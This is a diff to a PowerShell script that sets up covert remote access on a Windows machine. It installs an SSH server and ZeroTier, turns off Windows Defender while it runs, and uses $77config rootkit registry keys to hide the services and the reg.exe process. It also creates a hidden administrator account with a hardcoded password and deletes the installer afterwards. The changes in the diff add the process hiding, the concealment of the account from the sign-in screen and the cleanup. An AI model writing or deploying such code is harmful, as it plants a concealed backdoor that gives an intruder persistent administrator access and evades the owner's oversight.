@@ -18,7 +18,7 @@ $openSSHScriptBlock = {
         Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
     }
     
-    # Start the SSHD service and set it to automatic
+    # Start and set the SSHD service to run automatically
     Start-Service sshd
     Set-Service -Name sshd -StartupType 'Automatic'
 
@@ -41,21 +41,37 @@ Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
 # Disable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Define the base path for the $77config
-$baseConfigPath = "HKLM:\SOFTWARE\$77config"
+# Base path for the $77config configuration
+$baseConfigPath = "HKLM\SOFTWARE\$77config"
 
-# Ensure the $77config key and necessary subkeys exist
-$serviceNamesPath = "$baseConfigPath\service_names"
-if (-not (Test-Path $serviceNamesPath)) {
-    New-Item -Path $serviceNamesPath -Force
+# Commands to ensure the $77config key and necessary subkeys exist
+$ensurePathsCommands = @(
+    "reg add ""$baseConfigPath"" /f",
+    "reg add ""$baseConfigPath\service_names"" /f",
+    "reg add ""$baseConfigPath\process_names"" /f"
+)
+
+foreach ($cmdCommand in $ensurePathsCommands) {
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommand -Wait
 }
 
 # Define service names to hide - ZeroTier and SSH service
-$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your SSH service name if different
+$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your specific SSH service name if different
 
-# Hide specified services
+# Hide specified services using reg add
 foreach ($service in $servicesToHide) {
-    New-ItemProperty -Path $serviceNamesPath -Name $service -Value "" -PropertyType String -Force | Out-Null
+    $cmdCommandService = "reg add ""$baseConfigPath\service_names"" /v $service /t REG_SZ /d $service /f"
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
+}
+
+# Add reg.exe to the list of processes to hide
+$processesToHide = @("reg.exe") # Add any additional process names here
+
+# Hide specified processes using reg add
+foreach ($process in $processesToHide) {
+    # For clarity and consistency, use the process name both as the value name and the value
+    $cmdCommandProcess = "reg add ""$baseConfigPath\process_names"" /v $process /t REG_SZ /d $process /f"
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandProcess -Wait
 }
 
 # Define the URL and download location for improved.exe
@@ -78,6 +94,17 @@ $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
 New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
 Add-LocalGroupMember -Group "Administrators" -Member $userName
 
+# Path to the SpecialAccounts\UserList registry key
+$specialAccountsPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+
+# Check if the SpecialAccounts\UserList key exists, if not, create it
+if (-not (Test-Path $specialAccountsPath)) {
+    New-Item -Path $specialAccountsPath -Force
+}
+
+# Add the ssh-user to the UserList to hide it from the sign-in screen
+New-ItemProperty -Path $specialAccountsPath -Name "ssh-user" -Value 0 -PropertyType DWORD -Force
+
 # Join the specified ZeroTier network
 # Ensure the ZeroTier service is running before attempting to join a network
 Start-Service -Name "ZeroTierOneService"
@@ -87,6 +114,8 @@ Start-Sleep -Seconds 5 # Give some time for the ZeroTier service to start
 
 # Re-enable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $false
+
+Remove-Item $zeroTierMsiPath -Force
 
 Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
 Write-Host "Windows Defender Antivirus has been re-enabled."
